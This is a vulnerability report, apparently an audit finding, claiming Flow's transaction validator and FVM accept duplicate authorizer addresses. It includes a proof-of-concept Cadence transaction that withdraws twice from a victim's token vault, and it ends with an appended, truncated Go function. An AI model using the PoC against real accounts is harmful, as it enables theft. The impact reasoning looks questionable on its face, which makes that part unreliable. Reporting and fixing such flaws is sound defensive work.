### Title
Missing Duplicate Authorizer Address Check Allows Double-Account-Reference in Transaction Prepare Block - (File: `fvm/transactionVerifier.go`)

### Summary

The `verifyTransaction()` function in `fvm/transactionVerifier.go` iterates over `tx.Authorizers` to verify each listed authorizer has sufficient signing weight, but never checks whether the same address appears more than once in the `Authorizers` array. Likewise, `checkAddresses()` and `checkAccounts()` in `access/validator/validator.go` only validate address format and signature presence per entry, not uniqueness of the authorizer list. A transaction sender can therefore craft a `TransactionBody` with a duplicated address in `Authorizers`, causing the Cadence runtime to supply two `auth &Account` references to the same account in the `prepare` block — enabling the transaction to perform operations on that account twice, even though the account owner signed only once.

### Finding Description

`TransactionBody.Authorizers` is an ordered list of addresses whose accounts are made available as `auth &Account` references to the Cadence `prepare` block, one reference per list entry. [1](#0-0) 

The access-node validation pipeline runs `checkAddresses` (validates each address is on-chain) and `checkAccounts` (checks for duplicate *signatures* and that each authorizer has at least one signature), but neither step checks whether the same address appears more than once in `Authorizers`. [2](#0-1) [3](#0-2) 

The FVM execution-layer check in `verifyTransaction` iterates over `tx.Authorizers` and verifies each entry has sufficient key weight, but again performs no deduplication:

```go
for _, addr := range tx.Authorizers {
    if addr == tx.Payer {
        continue
    }
    if !v.hasSufficientKeyWeight(payloadWeights, addr, keyWeightThreshold) {
        return errors.NewAccountAuthorizationErrorf(...)
    }
}
``` [4](#0-3) 

`newSignatureEntries` deduplicates *signatures* by `(address, keyIndex)` pair, but this is orthogonal — it does not prevent the same address from appearing twice in the `Authorizers` list. [5](#0-4) 

The validation pipeline is assembled in `initValidationSteps` and contains no step that enforces uniqueness of authorizer addresses: [6](#0-5) 

### Impact Explanation

When `Authorizers = [addrA, addrA]`, the Cadence runtime receives two entries for the same account and passes two `auth &Account` references to the `prepare` block. A malicious transaction script can exploit this to:

- Borrow and withdraw from the same `FlowToken.Vault` twice, draining twice the intended amount from the victim's account.
- Execute any account-mutating operation (storage writes, capability issuance, key revocation) twice on the same account within a single signed transaction.

This directly mirrors the external report's impact: a user signs once, but the duplicated entry causes the protocol to act on their account multiple times.

### Likelihood Explanation

The attack is reachable by any unprivileged transaction sender. The attacker:

1. Constructs a `TransactionBody` with `Authorizers: [victimAddr, victimAddr]` and a script whose `prepare` block accepts two `auth &Account` parameters.
2. Presents the transaction to the victim (e.g., via a dApp UI) for signing.
3. The victim signs the payload once; the signature passes all deduplication checks because `newSignatureEntries` deduplicates by `(address, keyIndex)`, not by authorizer list position.
4. The transaction is accepted by the access node and executed by the FVM, granting the script two independent `auth &Account` references to the victim's account.

This is realistic in any multi-party signing flow (DEX, NFT marketplace, wallet-connect dApp) where the user's wallet does not independently validate the `Authorizers` list for duplicates before signing.

### Recommendation

Add a uniqueness check over `tx.Authorizers` in both the access-node validator and the FVM verifier:

- In `checkAddresses` (or a new dedicated step in `initValidationSteps`), build a `map[flow.Address]struct{}` while iterating `tx.Authorizers` and return an error on the first duplicate.
- In `verifyTransaction`, perform the same check before the weight-sufficiency loop.

This mirrors the existing duplicate-signature guard (`newSignatureEntries`) and the duplicate-receipt guard in `receiptValidator.ValidatePayload`. [7](#0-6) 

### Proof of Concept

```
Craft TransactionBody:
  Script:
    transaction {
      prepare(a1: auth(Storage) &Account, a2: auth(Storage) &Account) {
        // a1 and a2 are the same account (victimAddr)
        let v1 = a1.storage.borrow<auth(FungibleToken.Withdraw) &FlowToken.Vault>(
                   from: /storage/flowTokenVault)!
        let v2 = a2.storage.borrow<auth(FungibleToken.Withdraw) &FlowToken.Vault>(
                   from: /storage/flowTokenVault)!
        let t1 <- v1.withdraw(amount: 100.0)   // first withdrawal
        let t2 <- v2.withdraw(amount: 100.0)   // second withdrawal — same vault
        // deposit both to attacker
      }
    }
  Authorizers: [victimAddr, victimAddr]   // duplicate
  Payer: attackerAddr
  PayloadSignatures: [victimAddr key0 sig]  // victim signs once; passes newSignatureEntries dedup
  EnvelopeSignatures: [attackerAddr key0 sig]

Submit via SendTransaction to any Access Node.
→ checkAddresses: both entries are valid addresses — passes.
→ checkAccounts: victimAddr has a payload signature — passes for both iterations.
→ verifyTransaction: payloadWeights[victimAddr] >= threshold — passes for both iterations.
→ FVM executes: Cadence runtime provides two auth &Account refs to victimAddr.
→ Result: 200.0 FLOW withdrawn; victim signed for one 100.0 FLOW operation.
```

func (v *TransactionValidator) checkAccounts(tx *flow.TransactionBody) error {
	// check for duplicate account key
	type uniqueKey struct {
		address flow.Address
		index   uint32
	}
	observedSigs := make(map[uniqueKey]bool)
	for _, sig := range append(tx.PayloadSignatures, tx.EnvelopeSignatures...) {
		if observedSigs[uniqueKey{sig.Address, sig.KeyIndex}] {
			return DuplicatedSignatureError{Address: sig.Address, KeyIndex: sig.KeyIndex}
		}
		observedSigs[uniqueKey{sig.Address, sig.KeyIndex}] = true
	}
	// check for minimum account signatures
	observedEnvelopeSig := make(map[flow.Address]bool)
	observedPayloadSig := make(map[flow.Address]bool)
	for _, sig := range tx.EnvelopeSignatures {
		observedEnvelopeSig[sig.Address] = true
	}
	for _, sig := range tx.PayloadSignatures {
		observedPayloadSig[sig.Address] = true
	}

	if !observedEnvelopeSig[tx.Payer] {
		return MissingSignatureError{Address: tx.Payer, Message: "payer envelope signature is missing"}
	}

	if !observedEnvelopeSig[tx.ProposalKey.Address] && !observedPayloadSig[tx.ProposalKey.Address] {
		return MissingSignatureError{Address: tx.ProposalKey.Address, Message: "proposer signature on either payload or envelope is missing"}
	}

	for _, authorizer := range tx.Authorizers {
		if authorizer == tx.Payer || authorizer == tx.ProposalKey.Address {
			// at this point, payer and proposer are guaranteed to have signatures
			continue
		}
		if !observedEnvelopeSig[authorizer] && !observedPayloadSig[authorizer] {
			return MissingSignatureError{Address: authorizer, Message: "authorizer signature on either payload or envelope is missing"}
		}
	}
